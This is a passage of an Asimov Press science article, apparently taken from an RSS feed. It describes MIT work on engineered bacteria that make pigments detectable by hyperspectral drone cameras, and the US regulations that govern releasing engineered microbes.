    &lt;p&gt;Because each type of molecule absorbs and reflects light in a distinct way, the camera can be mounted onto satellites and used to record a full spectrum for every pixel on the ground. In plants, for example, these cameras can quantify shifts in chlorophyll levels because those molecules strongly absorb light in the blue and red regions. For soils, the spectra contain characteristic dips and peaks that correspond to moisture levels.&lt;/p&gt;
    &lt;p&gt;But the idea that these same cameras could be used to detect bacteria required a leap of imagination. It first came to Chris Voigt, professor of biological engineering at MIT, while touring a military facility, where soldiers explained how hyperspectral drones were being used to spot plastic objects from the sky. Foreign militaries sometimes hide explosives or sensors inside plastic casings and disguise them as rocks, but because real rocks reflect light differently than plastic dupes, hyperspectral cameras can distinguish between them.&lt;/p&gt;
    &lt;p&gt;If the military can distinguish plastic from rock, Voigt wondered, why not microbes from soil?&lt;/p&gt;
    &lt;p&gt;The work to answer this question fell to Yonatan Chemla and Itai Levin, a postdoctoral fellow and graduate student in Voigt’s laboratory. Their first challenge was to find molecules that cells make that could produce a distinctive hyperspectral fingerprint visible from a distance. So the duo began by searching through hundreds of thousands of metabolites listed in scientific databases, finding that only about 100 have any recorded absorption spectra.&lt;/p&gt;
    &lt;p&gt;Upon realizing that we don’t understand how the overwhelming majority of biomolecules reflect light, Chemla and Levin decided to investigate themselves. They bought a hyperspectral camera and a large number of purified molecules from online chemical suppliers — such as indigo and porphyrins — and started testing them in the laboratory. They sprayed these molecules onto soils or rocks, took pictures, and then tried to work out which ones produced a clear signal against background noise.&lt;/p&gt;
    &lt;p&gt;The duo also used computational tools to identify candidate molecules that might act as hyperspectral reporters. Together with collaborators at MIT, they ran quantum chemistry simulations on a selection of 20,000 metabolites to predict how each one would respond to light. These simulations calculated which wavelengths of light each chemical would absorb, and how strong those peaks would be.4 After running these computational tests, Chemla and Levin filtered this list down to a few hundred with unusual peaks or that absorbed light in parts of the spectrum where biology is usually quiet, especially near-infrared wavelengths.&lt;/p&gt;
    &lt;p&gt;Finally, they considered which of these molecules would be easiest and most efficient for a microbe to make, favoring ones that could be made by slightly altering natural pathways or requiring the addition of only a few recombinant genes. Since microbes can have very different metabolisms, they also weighed which hosts would be the best for each possible molecule. After this winnowing process, they ended up with just two: biliverdin IXα made by Pseudomonas putida, and bacteriochlorophyll a made by Rhodocyclus gelatinosus.&lt;/p&gt;
    &lt;p&gt;Biliverdin IXα is a green pigment that naturally forms when heme, the molecule carrying oxygen in red blood cells, is broken down and recycled. To make it in P. putida, the team only needed to add two enzymes. Bacteriochlorophyll a, on the other hand, is a photosynthetic pigment found in purple bacteria.5 R. gelatinosus is itself a purple bacterium, meaning that all the team needed to do was amend its existing genome to produce much larger quantities of bacteriochlorophyll a.&lt;/p&gt;
    &lt;p&gt;With these two engineered microbial strains in hand, the researchers traveled to Fort Devens in Massachusetts — alongside two undergraduate students, Anna Johnson and Yueyang Fan — and sprayed the cells onto little patches of soil. They flew a hyperspectral drone overhead and took pictures of one acre, or about 4,000 square meters, across the entire military facility. Using a hyperspectral detection algorithm that separated the molecular signal from background “noise” of soil and dirt, Chemla and Levin could clearly identify the engineered microbes from up to 90 meters away.6&lt;/p&gt;
    &lt;p&gt;Alas, the cells were layered on top of sand, in direct line of sight to the camera. But in many cases, the things we want to sense — like explosives or pathogens invading plant roots — are hidden underground. Chemla is now searching for volatile molecules that diffuse upward through the soil and into the air, creating a spectral signature that a camera can detect from high above (possibly even from outer space.)&lt;/p&gt;
    &lt;head rend="h2"&gt;Environmental Release&lt;/head&gt;
    &lt;p&gt;Despite this scientific breakthrough, it will be difficult to move these biosensors into the real world. Researchers have been testing engineered microbes in field trials for the last four decades, but few have been commercialized.&lt;/p&gt;
    &lt;p&gt;Field trials for genetically-engineered microbes peaked in the early 1990s but have fallen off since then, mainly due to increased regulations and mixed field trial results. In the late 1980s, engineered Agrobacterium radiobacter K1026 was approved in both Australia and the U.S. to fight crown gall disease in trees. (The microbe outcompetes disease-causing bacteria, killing them.)&lt;/p&gt;
    &lt;p&gt;But getting approval to release a microbe into the wild, without containment, can be incredibly arduous. The regulatory pathway is divided across the EPA, USDA, and FDA. Each agency has jurisdiction depending on the intended use; pesticides fall to the EPA, other agricultural products go to the USDA, and ingestible microbes fall under the province of the FDA. Anything that does not easily fit into these categories, including environmental biosensors, is lumped under the EPA’s Toxic Substances Control Act, or TSCA.&lt;/p&gt;
    &lt;p&gt;The TSCA regulates genetically engineered microbes based on their method of engineering, rather than the product itself. This practice is outdated and should be revised, Chemla says. Any microbe containing DNA from another genus — say, moving a gene from Escherichia coli into Pseudomonas putida — is flagged by the TSCA and unlikely to get approval, even if researchers can prove that the product is safe. More than 200 TSCA submissions were filed between 1987 and 2018, but none of those submissions have led to a commercialized product.&lt;/p&gt;
    &lt;p&gt;There are ways to skirt these regulations, though. Pivot Bio sells genetically-engineered microbes that colonize plant roots and convert atmospheric nitrogen (N₂) into ammonia (NH₃), a chemical form that plants can use. This reduces the amount of fertilizer needed for a field, thus decreasing the leaching of fertilizer byproducts into water.7&lt;/p&gt;
    &lt;p&gt;Pivot Bio sidestepped some regulatory hurdles by avoiding the transfer of genes from one species to another; they simply remodeled their organism’s existing genome. The company still must get USDA approval to ship its product across state lines, but that is a simpler and less insurmountable regulatory hurdle.&lt;/p&gt;
    &lt;p&gt;In the case of hyperspectral reporters, there may be similar ways to circumvent the most onerous regulations. Even in this study, the R. gelatinosus strain engineered to make bacteriochlorophyll a did not have any DNA from foreign microbes. It could, in principle, sidestep the TSCA regulations. A startup called Fieldstone Bio has spun out from the Voigt laboratory with the goal of commercializing this hyperspectral technology.&lt;/p&gt;
    &lt;p&gt;Regardless, the barrier to commercializing these biosensors is not scientific feasibility but rather a patchwork of rules written long before anyone imagined microbes capable of broadcasting messages into space.&lt;/p&gt;
    &lt;p&gt;Still, it’s promising to see that synthetic biology is moving past its reliance on visible light toward a broader range of transducers that let us measure biology in places once thought inaccessible, from the molecules inside a tumor to antibiotic resistance genes hidden in soil. The challenge ahead is not discovering what cells can sense, but engineering more reliable ways for them to communicate those impressions back to us.&lt;/p&gt;
    &lt;p&gt;Niko McCarty is a founding editor of Asimov Press.&lt;/p&gt;
    &lt;p&gt;Thanks to Xander Balwit and Ella Watkins-Dulaney for reading drafts of this.&lt;/p&gt;
    &lt;p&gt;Cite: McCarty, Niko. “Seeing Microbes from the Sky.” Asimov Press (2025). https://doi.org/10.62211/23jr-64kt&lt;/p&gt;
    &lt;p&gt;These mussels are used as natural biosensors because they filter large amounts of water and quickly react to pollutants. When they sense harmful chemicals, heavy metals, or sudden changes in water quality, they clamp their shells shut to protect themselves. When they close, a piece of metal hot glued to their shell completes a circuit which alerts the city to check their water system.&lt;/p&gt;
    &lt;p&gt;The synthetic biology community borrows many terms from computer science and electrical engineering. In electrical engineering, a transducer is a part that converts what a sensor has detected into electrical signals. A biological transducer is any sort of read out that signals what a biosensor has detected.&lt;/p&gt;
    &lt;p&gt;Visible wavelengths of light only penetrate about one millimeter into the body, for example. There is a tissue transparency window between 800 and 950 nanometers, though, in which light penetrates about a centimeter.&lt;/p&gt;
    &lt;p&gt;They used three databases, called BKMS, MetaCyc, and Rhea.&lt;/p&gt;
    &lt;p&gt;Bacteriochlorophyll a absorbs infrared light with a wavelength of 860 nanometers.&lt;/p&gt;
    &lt;p&gt;The camera could see the microbes provided there were at least 4 million cells per square centimeter of sand. This is quite a large number of cells, though, as a square centimeter of human skin has between 100 thousand and one million cells. A single gram of soil usually contains hundreds of millions of microbes.&lt;/p&gt;
    &lt;p&gt;The Haber-Bosch process, used to make ammonia, also accounts for between 1-2 percent of all global CO2 emissions.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45438704</guid><pubDate>Wed, 01 Oct 2025 15:15:44 +0000</pubDate></item></channel></rss>